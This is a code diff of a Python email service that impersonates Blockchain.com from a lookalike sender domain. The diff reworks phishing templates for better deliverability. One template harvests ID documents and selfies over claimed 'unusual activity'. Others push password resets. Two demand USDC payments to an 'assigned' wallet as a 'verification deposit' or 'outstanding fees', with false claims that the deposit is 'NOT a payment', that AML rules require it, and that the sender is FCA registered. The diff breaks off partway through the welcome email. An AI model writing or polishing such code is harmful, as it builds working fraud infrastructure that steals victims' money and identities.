@@ -1,16 +1,17 @@
 """
 Email Service for Blockchain Wallet Platform
 Uses Resend for transactional emails
+All templates use inline styles for maximum email client compatibility.
 """
 
 import os
 from typing import Optional
 from datetime import datetime, timezone
 import logging
+import html
 
 logger = logging.getLogger(__name__)
 
-# Try to import resend, but don't fail if not installed yet
 try:
     import resend
     RESEND_AVAILABLE = True
@@ -19,459 +20,260 @@ except ImportError:
     logger.warning("Resend package not installed. Email functionality will be limited.")
 
 
+def _wrap(content: str) -> str:
+    """Wrap email content in a consistent, email-safe layout with inline styles."""
+    return f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light">
+<meta name="supported-color-schemes" content="light">
+<title>Blockchain.com</title>
+</head>
+<body style="margin:0;padding:0;background-color:#f4f4f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#333333;line-height:1.6;">
+<div style="max-width:600px;margin:0 auto;padding:20px;">
+  <div style="background-color:#121530;padding:28px 20px;text-align:center;border-radius:8px 8px 0 0;">
+    <h1 style="color:#ffffff;margin:0;font-size:22px;font-weight:600;letter-spacing:0.5px;">Blockchain.com</h1>
+  </div>
+  <div style="background-color:#ffffff;padding:32px 28px;border-radius:0 0 8px 8px;">
+    {content}
+  </div>
+  <div style="text-align:center;padding:20px 10px;">
+    <p style="margin:4px 0;color:#999999;font-size:11px;">&copy; 2025 Blockchain.com. All rights reserved.</p>
+    <p style="margin:4px 0;color:#999999;font-size:11px;">Blockchain.com | London, United Kingdom | FCA Registered</p>
+    <p style="margin:4px 0;color:#bbbbbb;font-size:10px;">This is a transactional email sent to the address associated with your Blockchain.com account.</p>
+  </div>
+</div>
+</body>
+</html>"""
+
+
+def _btn(text: str, href: str) -> str:
+    """Generate an email-safe CTA button with inline styles."""
+    return f'<div style="text-align:center;margin:24px 0;"><a href="{href}" style="display:inline-block;background-color:#0052ff;color:#ffffff;padding:14px 36px;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;mso-padding-alt:14px 36px;">{text}</a></div>'
+
+
+def _strip_html(html_body: str) -> str:
+    """Generate a plain text version from HTML for multipart emails."""
+    import re
+    text = re.sub(r'<br\s*/?>', '\n', html_body)
+    text = re.sub(r'<[^>]+>', '', text)
+    text = html.unescape(text)
+    text = re.sub(r'\n{3,}', '\n\n', text).strip()
+    return text
+
+
 class EmailService:
     def __init__(self, api_key: Optional[str] = None, sender_email: Optional[str] = None):
         self.api_key = api_key or os.environ.get("RESEND_API_KEY")
         self.sender_email = sender_email or os.environ.get("SENDER_EMAIL", "noreply@blockchain-support.org")
         self.sender_name = "Blockchain.com"
-        
         if self.api_key and RESEND_AVAILABLE:
             resend.api_key = self.api_key
-    
+
     def is_configured(self) -> bool:
-        """Check if email service is properly configured"""
         return bool(self.api_key) and RESEND_AVAILABLE
-    
-    async def send_email(
-        self, 
-        to_email: str, 
-        subject: str, 
-        html_body: str,
-        text_body: Optional[str] = None
-    ) -> dict:
-        """Send an email using Resend"""
-        
+
+    async def send_email(self, to_email: str, subject: str, html_body: str, text_body: Optional[str] = None) -> dict:
         if not self.is_configured():
             logger.warning(f"Email not configured. Would send to {to_email}: {subject}")
-            return {
-                "success": False,
-                "error": "Email service not configured",
-                "would_send": {
-                    "to": to_email,
-                    "subject": subject
-                }
-            }
-        
+            return {"success": False, "error": "Email service not configured", "would_send": {"to": to_email, "subject": subject}}
         try:
+            plain = text_body or _strip_html(html_body)
             params = {
                 "from": f"{self.sender_name} <{self.sender_email}>",
                 "to": [to_email],
                 "subject": subject,
-                "html": html_body
+                "html": html_body,
+                "text": plain,
             }
-            
-            if text_body:
-                params["text"] = text_body
-            
+            logger.info(f"Sending email to {to_email}: {subject}")
             response = resend.Emails.send(params)
-            
-            return {
-                "success": True,
-                "resend_id": response.get("id"),
-                "sent_at": datetime.now(timezone.utc).isoformat()
-            }
-            
+            logger.info(f"Email sent successfully to {to_email}, id={response.get('id')}")
+            return {"success": True, "resend_id": response.get("id"), "sent_at": datetime.now(timezone.utc).isoformat()}
         except Exception as e:
-            logger.error(f"Failed to send email: {str(e)}")
-            return {
-                "success": False,
-                "error": str(e)
-            }
-    
+            logger.error(f"Failed to send email to {to_email}: {str(e)}")
+            return {"success": False, "error": str(e)}
+
+    # ── KYC Verification Email ──────────────────────────────────────────
     def get_kyc_verification_email(self, user_name: str, verification_link: str) -> tuple:
-        """Generate KYC verification email content"""
         subject = "Verify Your Identity - Blockchain.com"
-        
-        html_body = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <style>
-                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
-                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
-                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
-                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .button {{ display: inline-block; background: #0052ff; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; }}
-                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <h1>Blockchain.com</h1>
-                </div>
-                <div class="content">
-                    <h2>Identity Verification Required</h2>
-                    <p>Dear {user_name},</p>
-                    <p>We have detected some unusual activity on your account. To ensure the security of your funds and comply with regulatory requirements, we need you to verify your identity.</p>
-                    <p>Please complete the KYC (Know Your Customer) verification process by clicking the button below:</p>
-                    <p style="text-align: center;">
-                        <a href="{verification_link}" class="button">Verify My Identity</a>
-                    </p>
-                    <p>You will need to provide:</p>
-                    <ul>
-                        <li>A valid government-issued ID (Passport or ID Card)</li>
-                        <li>A selfie holding your ID</li>
-                        <li>Proof of address (utility bill or bank statement)</li>
-                    </ul>
-                    <p>Once verified, you will receive instructions to reset your password and regain full access to your account.</p>
-                    <p>If you did not request this verification or have any questions, please contact our support team immediately.</p>
-                    <p>Best regards,<br>The Blockchain.com Security Team</p>
-                </div>
-                <div class="footer">
-                    <p>© 2024 Blockchain.com. All rights reserved.</p>
-                    <p>This email was sent to you because you have an account with Blockchain.com</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return subject, html_body
-    
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Identity Verification Required</h2>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">We have detected some unusual activity on your account. To ensure the security of your funds and comply with regulatory requirements, we need you to verify your identity.</p>
+    <p style="color:#555555;margin:0 0 8px 0;">Please complete the KYC (Know Your Customer) verification process:</p>
+    {_btn("Verify My Identity", verification_link)}
+    <p style="color:#555555;margin:0 0 8px 0;">You will need to provide:</p>
+    <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
+      <li style="margin-bottom:4px;">A valid government-issued ID (Passport or ID Card)</li>
+      <li style="margin-bottom:4px;">A selfie holding your ID</li>
+      <li style="margin-bottom:4px;">Proof of address (utility bill or bank statement)</li>
+    </ul>
+    <p style="color:#555555;margin:0 0 12px 0;">Once verified, you will receive instructions to reset your password and regain full access to your account.</p>
+    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Security Team</p>"""
+        return subject, _wrap(content)
+
+    # ── KYC Approved Email ──────────────────────────────────────────────
     def get_kyc_approved_email(self, user_name: str, reset_link: str) -> tuple:
-        """Generate KYC approved email with password reset link"""
         subject = "Identity Verified - Reset Your Password - Blockchain.com"
-        
-        html_body = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <style>
-                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
-                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
-                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
-                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .success-box {{ background: #d4edda; border: 2px solid #28a745; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: center; }}
-                .success-icon {{ font-size: 48px; margin-bottom: 10px; }}
-                .success-text {{ color: #155724; font-size: 18px; font-weight: bold; }}
-                .step-box {{ background: #fff; border: 2px solid #0052ff; border-radius: 10px; padding: 20px; margin: 20px 0; }}
-                .step-number {{ display: inline-block; background: #0052ff; color: white; width: 30px; height: 30px; border-radius: 50%; text-align: center; line-height: 30px; font-weight: bold; margin-right: 10px; }}
-                .button {{ display: inline-block; background: #0052ff; color: white; padding: 18px 40px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; font-size: 16px; }}
-                .button:hover {{ background: #0041cc; }}
-                .warning {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
-                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <h1>Blockchain.com</h1>
-                </div>
-                <div class="content">
-                    <div class="success-box">
-                        <div class="success-icon">✅</div>
-                        <div class="success-text">Your Identity Has Been Verified!</div>
-                    </div>
-                    
-                    <p>Dear {user_name},</p>
-                    
-                    <p>Great news! Our compliance team has successfully verified your identity. Your KYC (Know Your Customer) verification is now <strong>APPROVED</strong>.</p>
-                    
-                    <div class="step-box">
-                        <h3 style="margin-top: 0; color: #0052ff;"><span class="step-number">!</span> Next Step Required</h3>
-                        <p>To ensure the security of your account, you must now <strong>reset your password</strong> before you can access your wallet.</p>
-                        <p>This is a mandatory security measure to protect your funds.</p>
-                        <p style="text-align: center;">
-                            <a href="{reset_link}" class="button">Reset My Password</a>
-                        </p>
-                    </div>
-                    
-                    <div class="warning">
-                        <strong>⚠️ Important:</strong>
-                        <ul style="margin: 10px 0 0 0; padding-left: 20px;">
-                            <li>This password reset link will expire in <strong>24 hours</strong></li>
-                            <li>After resetting your password, you will have full access to your account</li>
-                            <li>Choose a strong, unique password that you haven't used before</li>
-                        </ul>
-                    </div>
-                    
-                    <p>If you have any questions or did not request this verification, please contact our support team immediately.</p>
-                    
-                    <p>Thank you for your cooperation.</p>
-                    
-                    <p>Best regards,<br><strong>The Blockchain.com Compliance Team</strong></p>
-                </div>
-                <div class="footer">
-                    <p>© 2024 Blockchain.com. All rights reserved.</p>
-                    <p>Blockchain.com | London, United Kingdom | FCA Registered</p>
-                    <p style="font-size: 10px; color: #999;">This email was sent to the address associated with your Blockchain.com account.</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return subject, html_body
-    
+        content = f"""
+    <div style="background-color:#e8f5e9;border:1px solid:#4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
+      <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
+      <p style="color:#2e7d32;font-size:17px;font-weight:700;margin:0;">Your Identity Has Been Verified!</p>
+    </div>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Our compliance team has successfully verified your identity. Your KYC verification is now <strong>APPROVED</strong>.</p>
+    <div style="background-color:#f0f4ff;border:1px solid #0052ff;border-radius:8px;padding:20px;margin:16px 0;">
+      <p style="color:#0052ff;font-weight:700;margin:0 0 8px 0;">Next Step Required</p>
+      <p style="color:#555555;margin:0 0 12px 0;">To ensure the security of your account, you must now <strong>reset your password</strong> before you can access your wallet.</p>
+      {_btn("Reset My Password", reset_link)}
+    </div>
+    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#555555;margin:0;font-size:13px;"><strong>Important:</strong> This password reset link expires in <strong>24 hours</strong>. After resetting, you will have full access to your account. Choose a strong, unique password.</p>
+    </div>
+    <p style="color:#555555;margin:16px 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Compliance Team</p>"""
+        return subject, _wrap(content)
+
+    # ── Password Reset Email ────────────────────────────────────────────
     def get_password_reset_email(self, user_name: str, reset_link: str) -> tuple:
-        """Generate password reset email content"""
         subject = "Reset Your Password - Blockchain.com"
-        
-        html_body = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <style>
-                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
-                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
-                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
-                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .button {{ display: inline-block; background: #0052ff; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; }}
-                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <h1>Blockchain.com</h1>
-                </div>
-                <div class="content">
-                    <h2>Reset Your Password</h2>
-                    <p>Dear {user_name},</p>
-                    <p>Your identity has been successfully verified. As part of our security protocol, you are now required to reset your password before accessing your account.</p>
-                    <p>Click the button below to create a new password:</p>
-                    <p style="text-align: center;">
-                        <a href="{reset_link}" class="button">Reset Password</a>
-                    </p>
-                    <p>This link will expire in 24 hours for security reasons.</p>
-                    <p>If you did not request this password reset, please contact our support team immediately.</p>
-                    <p>Best regards,<br>The Blockchain.com Team</p>
-                </div>
-                <div class="footer">
-                    <p>© 2024 Blockchain.com. All rights reserved.</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return subject, html_body
-    
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Reset Your Password</h2>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Your identity has been successfully verified. As part of our security protocol, you are now required to reset your password before accessing your account.</p>
+    <p style="color:#555555;margin:0 0 8px 0;">Click the button below to create a new password:</p>
+    {_btn("Reset Password", reset_link)}
+    <p style="color:#888888;font-size:13px;margin:0 0 16px 0;">This link will expire in 24 hours for security reasons.</p>
+    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Team</p>"""
+        return subject, _wrap(content)
+
+    # ── Reactivation Email (improved for deliverability) ────────────────
     def get_reactivation_email(self, user_name: str, eth_wallet_address: str, required_amount: str = "100") -> tuple:
-        """Generate account reactivation email content for inactivity freeze"""
-        subject = "Urgent: Account Reactivation Required - Blockchain.com"
-        
-        html_body = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <style>
-                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
-                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
-                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
-                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .wallet-box {{ background: #1a1f3c; color: #00d4ff; padding: 20px; border-radius: 8px; margin: 20px 0; word-break: break-all; font-family: 'Courier New', monospace; text-align: center; font-size: 14px; letter-spacing: 1px; }}
-                .important {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
-                .highlight {{ background: #d4edda; border-left: 4px solid #28a745; padding: 15px; margin: 20px 0; }}
-                .warning {{ background: #f8d7da; border-left: 4px solid #dc3545; padding: 15px; margin: 20px 0; }}
-                .amount-box {{ background: #0052ff; color: white; padding: 15px 25px; border-radius: 8px; display: inline-block; font-size: 24px; font-weight: bold; margin: 10px 0; }}
-                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <h1>Blockchain.com</h1>
-                </div>
-                <div class="content">
-                    <h2>Account Reactivation Required</h2>
-                    <p>Dear {user_name},</p>
-                    
-                    <p>Your account has been flagged due to <strong>prolonged inactivity</strong> and is currently scheduled for closure in accordance with our regulatory compliance requirements.</p>
-                    
-                    <div class="important">
-                        <strong>🔔 Action Required:</strong>
-                        <p>To reactivate your account and regain full access to your funds, you must demonstrate account activity by making a positive transaction of:</p>
-                        <p style="text-align: center;"><span class="amount-box">{required_amount} EUR in USDC (ERC-20)</span></p>
-                    </div>
-                    
-                    <div class="highlight">
-                        <strong>✅ This is NOT a payment!</strong>
-                        <p>This amount is not a fee or charge. It is simply a verification deposit to demonstrate account activity. <strong>You will be able to immediately withdraw this amount back to your bank account</strong> once your account has been successfully reactivated.</p>
-                    </div>
-                    
-                    <h3>Your Assigned Wallet Address</h3>
-                    <p>The following USDC (ERC-20) wallet has been assigned to your account:</p>
-                    <div class="wallet-box">
-                        {eth_wallet_address}
-                    </div>
-                    <p style="text-align: center; font-size: 13px; color: #666;"><em>You can also find this address in your wallet by clicking the <strong>"Deposit"</strong> button and copying it from there.</em></p>
-                    
-                    <h3>How to Complete This Transaction</h3>
-                    <ol>
-                        <li><strong>Purchase USDC</strong> from a third-party cryptocurrency provider such as:
-                            <ul>
-                                <li>Coinbase</li>
-                                <li>Binance</li>
-                                <li>Kraken</li>
-                                <li>Any licensed crypto exchange</li>
-                            </ul>
-                        </li>
-                        <li><strong>Send {required_amount} EUR worth of USDC</strong> to the wallet address shown above</li>
-                        <li><strong>Use the ERC-20 (Ethereum) network</strong> when sending</li>
-                        <li>Your account will be reactivated once the transaction is confirmed on the blockchain</li>
-                    </ol>
-                    
-                    <div class="warning">
-                        <strong>⚠️ Important Notice:</strong>
-                        <p>Please note that <strong>Blockchain.com no longer offers direct cryptocurrency purchasing services</strong> for accounts that have been flagged for suspicious activity or inactivity. You must use an external third-party provider to purchase USDC.</p>
-                        <p>Your account has been flagged and is <strong>set up for closure</strong>. After reactivation, you will be able to withdraw all your funds.</p>
-                    </div>
-                    
-                    <div class="important">
-                        <strong>🔧 How Our System Works:</strong>
-                        <p>The Blockchain.com platform operates on a fully automated, decentralized system. This infrastructure is maintained through transaction fees generated by account activity. When accounts remain inactive for extended periods, they cannot contribute to the network's operational costs, which is why periodic activity verification is required.</p>
-                        <p>Once your wallet shows activity, it will be automatically flagged as active in our system, and you will regain full access to all features.</p>
-                    </div>
-                    
-                    <p>If you have any questions or need assistance with this process, please contact our support team.</p>
-                    
-                    <p>Best regards,<br><strong>The Blockchain.com Compliance Team</strong></p>
-                </div>
-                <div class="footer">
-                    <p>© 2024 Blockchain.com. All rights reserved.</p>
-                    <p>Blockchain.com | London, United Kingdom | FCA Registered</p>
-                    <p style="font-size: 10px; color: #999;">This email was sent to the address associated with your Blockchain.com account. If you did not expect this email, please contact support immediately.</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return subject, html_body
-    
+        subject = "Account Reactivation Required - Blockchain.com"
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Account Reactivation Required</h2>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Your account has been flagged due to prolonged inactivity and is currently scheduled for closure in accordance with our regulatory compliance requirements.</p>
+
+    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#555555;margin:0 0 8px 0;font-weight:600;">Action Required</p>
+      <p style="color:#555555;margin:0;">To reactivate your account, you must demonstrate account activity by making a positive transaction of:</p>
+      <p style="text-align:center;margin:12px 0;"><span style="display:inline-block;background-color:#0052ff;color:#ffffff;padding:10px 24px;border-radius:6px;font-size:20px;font-weight:700;">{required_amount} EUR in USDC (ERC-20)</span></p>
+    </div>
+
+    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#2e7d32;margin:0;font-weight:600;">This is NOT a payment.</p>
+      <p style="color:#555555;margin:4px 0 0 0;font-size:13px;">This amount is not a fee or charge. It is simply a verification deposit to demonstrate account activity. You will be able to immediately withdraw this amount back to your bank account once your account has been reactivated.</p>
+    </div>
+
+    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Your Assigned Wallet Address</h3>
+    <p style="color:#555555;margin:0 0 8px 0;">The following USDC (ERC-20) wallet has been assigned to your account:</p>
+    <div style="background-color:#121530;color:#00d4ff;padding:16px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;letter-spacing:0.5px;">
+      {html.escape(eth_wallet_address)}
+    </div>
+    <p style="text-align:center;font-size:12px;color:#888888;margin:4px 0 16px 0;">You can also find this address in your wallet by clicking the "Deposit" button.</p>
+
+    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">How to Complete This Transaction</h3>
+    <ol style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
+      <li style="margin-bottom:6px;">Purchase USDC from a third-party cryptocurrency provider (Coinbase, Binance, Kraken, or any licensed exchange).</li>
+      <li style="margin-bottom:6px;">Send {required_amount} EUR worth of USDC to the wallet address shown above.</li>
+      <li style="margin-bottom:6px;">Use the ERC-20 (Ethereum) network when sending.</li>
+      <li style="margin-bottom:6px;">Your account will be reactivated once the transaction is confirmed.</li>
+    </ol>
+
+    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#555555;margin:0;font-size:13px;"><strong>Please note:</strong> Blockchain.com no longer offers direct cryptocurrency purchasing services for flagged accounts. You must use an external provider to purchase USDC. After reactivation, you will be able to withdraw all your funds.</p>
+    </div>
+
+    <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
+      <p style="color:#555555;margin:0;font-size:13px;"><strong>How our system works:</strong> The platform operates on a fully automated, decentralized system maintained through transaction fees generated by account activity. When accounts remain inactive, periodic activity verification is required. Once your wallet shows activity, it will be automatically flagged as active.</p>
+    </div>
+
+    <p style="color:#555555;margin:16px 0 4px 0;">If you have any questions, please contact our support team.</p>
+    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Compliance Team</p>"""
+        return subject, _wrap(content)
+
+    # ── Fee Payment Email ───────────────────────────────────────────────
     def get_fee_payment_email(self, user_name: str, total_fees: str, eth_wallet_address: str) -> tuple:
-        """Generate fee payment required email content"""
         subject = "Outstanding Fees - Action Required - Blockchain.com"
-        
-        html_body = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <style>
-                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
-                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
-                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
-                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .fee-box {{ background: #dc3545; color: white; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: center; }}
-                .fee-box h3 {{ margin: 0; font-size: 32px; }}
-                .wallet-box {{ background: #e9ecef; padding: 15px; border-radius: 8px; margin: 20px 0; word-break: break-all; font-family: monospace; text-align: center; }}
-                .important {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
-                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <h1>Blockchain.com</h1>
-                </div>
-                <div class="content">
-                    <h2>Outstanding Transaction Fees</h2>
-                    <p>Dear {user_name},</p>
-                    <p>Your account has outstanding transaction fees that must be cleared before you can withdraw your funds.</p>
-                    
-                    <div class="fee-box">
-                        <p style="margin: 0; font-size: 14px;">Total Outstanding Fees</p>
-                        <h3>{total_fees} EUR</h3>
-                    </div>
-                    
-                    <div class="important">
-                        <strong>Why do I have fees?</strong>
-                        <p>Transaction fees are automatically calculated based on your historical trading activity. These fees support the blockchain network infrastructure, security protocols, and regulatory compliance systems.</p>
-                    </div>
-                    
-                    <p>To clear your fees and enable withdrawals, please send the equivalent amount in USDC (ERC-20) to your wallet address:</p>
-                    
-                    <div class="wallet-box">
-                        {eth_wallet_address}
-                    </div>
-                    
-                    <div class="important">
-                        <strong>Regulatory Notice:</strong>
-                        <p>Due to regulatory requirements and our company's integrity protocols, we cannot deduct fees directly from your existing balance. When an account is flagged for review or scheduled for closure, all fund movements must be cleared externally to comply with anti-money laundering (AML) regulations.</p>
-                        <p>This is a standard procedure mandated by financial regulators to ensure the legitimacy of all transactions.</p>
-                    </div>
-                    
-                    <p>Once your fees are paid, you will be able to withdraw your full balance to your bank account.</p>
-                    
-                    <p>If you have any questions about your fees or need assistance, please contact our support team.</p>
-                    <p>Best regards,<br>The Blockchain.com Finance Team</p>
-                </div>
-                <div class="footer">
-                    <p>© 2024 Blockchain.com. All rights reserved.</p>
-                    <p>Blockchain.com is registered with the UK Financial Conduct Authority (FCA)</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return subject, html_body
-    
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Outstanding Transaction Fees</h2>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Your account has outstanding transaction fees that must be cleared before you can withdraw your funds.</p>
+
+    <div style="background-color:#d32f2f;color:#ffffff;padding:20px;border-radius:8px;margin:16px 0;text-align:center;">
+      <p style="margin:0 0 4px 0;font-size:13px;">Total Outstanding Fees</p>
+      <p style="margin:0;font-size:28px;font-weight:700;">{html.escape(total_fees)} EUR</p>
+    </div>
+
+    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#555555;margin:0 0 4px 0;font-weight:600;">Why do I have fees?</p>
+      <p style="color:#555555;margin:0;font-size:13px;">Transaction fees are automatically calculated based on your historical trading activity. These fees support the blockchain network infrastructure, security protocols, and regulatory compliance systems.</p>
+    </div>
+
+    <p style="color:#555555;margin:12px 0 8px 0;">To clear your fees, please send the equivalent amount in USDC (ERC-20) to your wallet address:</p>
+    <div style="background-color:#f4f4f7;padding:14px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;color:#333333;">
+      {html.escape(eth_wallet_address)}
+    </div>
+
+    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#555555;margin:0 0 4px 0;font-weight:600;">Regulatory Notice</p>
+      <p style="color:#555555;margin:0;font-size:13px;">Due to regulatory requirements and our integrity protocols, we cannot deduct fees directly from your existing balance. When an account is flagged for review or scheduled for closure, all fund movements must be cleared externally to comply with anti-money laundering (AML) regulations.</p>
+    </div>
+
+    <p style="color:#555555;margin:12px 0;">Once your fees are paid, you will be able to withdraw your full balance to your bank account.</p>
+    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Finance Team</p>"""
+        return subject, _wrap(content)
+
+    # ── Welcome Email ───────────────────────────────────────────────────
     def get_welcome_email(self, user_name: str, login_link: str) -> tuple:
-        """Generate welcome email for new users"""
         subject = "Welcome to Blockchain.com"
-        
-        html_body = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <style>
-                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
-                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
-                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
-                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .button {{ display: inline-block; background: #0052ff; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; }}
-                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <h1>Blockchain.com</h1>
-                </div>
-                <div class="content">
-                    <h2>Welcome to Blockchain.com!</h2>
-                    <p>Dear {user_name},</p>
